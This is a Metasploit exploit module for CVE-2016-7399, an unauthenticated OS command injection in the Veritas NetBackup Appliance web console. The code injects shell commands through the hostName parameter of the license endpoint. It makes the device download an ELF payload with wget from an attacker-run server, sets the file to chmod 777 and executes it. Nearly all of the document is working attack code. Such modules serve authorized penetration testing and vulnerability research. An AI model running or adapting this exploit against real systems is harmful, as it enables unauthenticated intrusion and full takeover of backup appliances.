##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Veritas NetBackup Appliance Web Console OS Command Injection',
      'Description' => %q{
        The Veritas NetBackup Appliance is vulnerable to an unauthenticated OS Command Injection 
        Vulnerability via arguments passed to backend perl scripts when performing license verification.
        Since it is a blind os command injection vulnerability, there is no output for the
        executed command when using the cmd generic payload. This module was tested against
        a Veritas NetBackup Appliance Version 2.7.2. A ping command against a
        controlled system could be used for testing purposes. The exploit uses the wget
        client from the device to convert the command injection into an arbitrary payload
        execution.
      },
      'Author'      =>
        [
          'Matthew Hall <hallm[at]sec-1.com>', # Vulnerability discovery and Metasploit module
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          [ 'CVE', '2016-7399' ],
          [ 'URL', 'https://www.veritas.com/content/support/en_US/security/VTS16-002.html' ],
          [ 'URL', 'http://www.sec-1.com/blog/2016/veritas-netbackup-appliance-unauthenticated-remote-command-execution/' ]
        ],
      'DisclosureDate' => 'Oct 04 2016',
      'Privileged'     => true,
      'Platform'       => %w{ linux unix },
      'Payload'        =>
        {
          'DisableNops' => true
        },
      'Targets'        =>
        [
          [ 'CMD',
            {
            'Arch' => ARCH_CMD,
            'Platform' => 'unix'
            }
          ],
          [ 'Linux Payload',
            {
            'Arch' => ARCH_X86,
            'Platform' => 'linux'
            }
          ],
        ],
      'DefaultTarget'  => 1,
      ))

    register_options(
      [
        OptAddress.new('DOWNHOST', [ false, 'An alternative host to request the payload from' ]),
        OptString.new('DOWNFILE', [ false, 'Filename to download, (default: random)' ]),
        OptInt.new('HTTP_DELAY', [true, 'Time that the HTTP Server will wait for the ELF payload request', 60])
      ], self.class)
  end


  def request(cmd)
    cmd = cmd.gsub(" ", '%20')
    begin
      print_status("#{rhost}:#{rport} - Sending Command #{cmd}")

      res = send_request_raw({
        'uri'    => '/appliancews/getLicense?hostName=' + "$(" + cmd + ")",
        'method' => 'GET',
      })
      return res
    rescue ::Rex::ConnectionError
      vprint_error("#{rhost}:#{rport} - Failed to connect to the web server")
      return nil
    end
  end

  def exploit
    downfile = datastore['DOWNFILE'] || rand_text_alpha(8+rand(8))
    @timeout = 1

    if target.name =~ /CMD/
      if not (datastore['CMD'])
        fail_with(Failure::BadConfig, "#{rhost}:#{rport} - Only the cmd/generic payload is compatible")
      end
      #cmd = payload.raw
      cmd = Rex::Text.uri_decode(payload.raw)
      res = request(cmd)
      if (!res)
        fail_with(Failure::Unknown, "#{rhost}:#{rport} - Unable to execute payload")
      else
        print_status("#{rhost}:#{rport} - Blind Exploitation - unknown Exploitation state")
      end
      return
    end

    @pl = generate_payload_exe
    @elf_sent = false

    #
    # start our server
    #
    resource_uri = '/' + downfile

    if (datastore['DOWNHOST'])
      service_url = 'http://' + datastore['DOWNHOST'] + ':' + datastore['SRVPORT'].to_s + resource_uri
    else
      #do not use SSL
      if datastore['SSL']
        ssl_restore = true
        datastore['SSL'] = false
      end

      if (datastore['SRVHOST'] == "0.0.0.0" or datastore['SRVHOST'] == "::")
        srv_host = Rex::Socket.source_address(rhost)
      else
        srv_host = datastore['SRVHOST']
      end

      service_url = 'http://' + srv_host + ':' + datastore['SRVPORT'].to_s + resource_uri
      print_status("#{rhost}:#{rport} - Starting up our web service on #{service_url} ...")
      start_service({'Uri' => {
        'Proc' => Proc.new { |cli, req|
          on_request_uri(cli, req)
        },
        'Path' => resource_uri
      }})

      datastore['SSL'] = true if ssl_restore
    end

    #
    # download payload
    #
    print_status("#{rhost}:#{rport} - Asking the Veritas device to download #{service_url}")
    #this filename is used to store the payload on the device
    filename = rand_text_alpha_lower(8)

    #not working if we send all command together -> lets take three requests
    cmd = "/usr/bin/wget #{service_url} -O /tmp/#{filename}"
    res = request(cmd)
    if (!res)
      fail_with(Failure::Unknown, "#{rhost}:#{rport} - Unable to deploy payload")
    end

    # wait for payload download
    if (datastore['DOWNHOST'])
      print_status("#{rhost}:#{rport} - Giving #{datastore['HTTP_DELAY']} seconds to the Veritas device to download the payload")
      select(nil, nil, nil, datastore['HTTP_DELAY'])
    else
      wait_linux_payload
    end
    register_file_for_cleanup("/tmp/#{filename}")

    print_status("#{rhost}:#{rport} - Waiting #{@timeout} seconds")
    select(nil, nil, nil, @timeout)

    #
    # chmod
    #
    cmd = "chmod 777 /tmp/#{filename}"
    print_status("#{rhost}:#{rport} - Asking the Veritas device to chmod #{downfile}")
    res = request(cmd)
    if (!res)
      fail_with(Failure::Unknown, "#{rhost}:#{rport} - Unable to deploy payload")
    end
    print_status("#{rhost}:#{rport} - Waiting #{@timeout} seconds")
    select(nil, nil, nil, @timeout)

    #
    # execute
    #
    cmd = "/tmp/#{filename}"
    print_status("#{rhost}:#{rport} - Asking the Veritas device to execute #{downfile}")
    res = request(cmd)
    if (!res)
      fail_with(Failure::Unknown, "#{rhost}:#{rport} - Unable to deploy payload")
    end

  end

  # Handle incoming requests from the server
  def on_request_uri(cli, request)
    #print_status("on_request_uri called: #{request.inspect}")
    if (not @pl)
      print_error("#{rhost}:#{rport} - A request came in, but the payload wasn't ready yet!")
      return
    end
    print_status("#{rhost}:#{rport} - Sending the payload to the server...")
    @elf_sent = true
    send_response(cli, @pl)
  end

  # wait for the data to be sent
  def wait_linux_payload
    print_status("#{rhost}:#{rport} - Waiting for the victim to request the ELF payload...")

    waited = 0
    while (not @elf_sent)
      select(nil, nil, nil, 1)
      waited += 1
      if (waited > datastore['HTTP_DELAY'])
        fail_with(Failure::Unknown, "#{rhost}:#{rport} - Target didn't request request the ELF payload -- Maybe it cant connect back to us?")
      end
    end
  end

end
